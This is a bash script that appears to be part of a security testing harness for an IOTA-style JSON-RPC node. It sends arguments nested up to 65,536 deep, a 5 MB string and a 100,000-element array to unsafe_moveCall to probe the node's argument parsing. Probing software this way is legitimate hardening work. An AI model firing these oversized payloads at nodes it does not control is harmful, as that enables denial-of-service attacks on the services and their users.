#!/usr/bin/env bash
# Probe: deeply nested / oversized JSON-RPC argument payloads that pass
# through `IotaJsonValue::new` and `to_move_value`.
#
# Targets:
#   - unsafe_moveCall: arguments are `IotaJsonValue` arrays
#   - unsafe_batchTransaction: same
#
# We try:
#   - a JSON request body whose top-level shape is well-formed but whose
#     `arguments` field is an array nested 10000 deep
#   - very long string arguments
#
# We do NOT need a real package/module to trigger argument validation — the
# server validates argument shape early.
set -u
HERE="$(dirname "$0")"
. "$HERE/lib.sh"

probe() { run_probe "nested_json/$1" "$2" || return 1; }

ADDR='0x0000000000000000000000000000000000000000000000000000000000000001'

build_nested_array() {
  python3 - "$1" <<'PY'
import sys
n = int(sys.argv[1])
sys.stdout.write("[" * n + "]" * n)
PY
}

build_repeated_array() {
  # Produces an array of N nested arrays (each 1-deep) — large flat
  # structure rather than deep nesting.
  python3 - "$1" <<'PY'
import sys
n = int(sys.argv[1])
sys.stdout.write("[" + ",".join(["[]"]*n) + "]")
PY
}

for depth in 64 256 1024 8192 65536; do
  arr=$(build_nested_array "$depth")
  probe "movecall_nested_${depth}" '{
    "jsonrpc":"2.0","id":1,"method":"unsafe_moveCall",
    "params":["'"$ADDR"'","0x2","coin","split",[], ['"$arr"'],null,1000000,null]
  }'
done

# Long string argument
long_str=$(python3 -c 'import sys;sys.stdout.write("a"*5000000)')
probe "movecall_long_string" '{
  "jsonrpc":"2.0","id":1,"method":"unsafe_moveCall",
  "params":["'"$ADDR"'","0x2","coin","split",[], ["'"$long_str"'"],null,1000000,null]
}'

# Very wide flat array
wide_arr=$(build_repeated_array 100000)
probe "movecall_wide_array" '{
  "jsonrpc":"2.0","id":1,"method":"unsafe_moveCall",
  "params":["'"$ADDR"'","0x2","coin","split",[], ['"$wide_arr"'],null,1000000,null]
}'
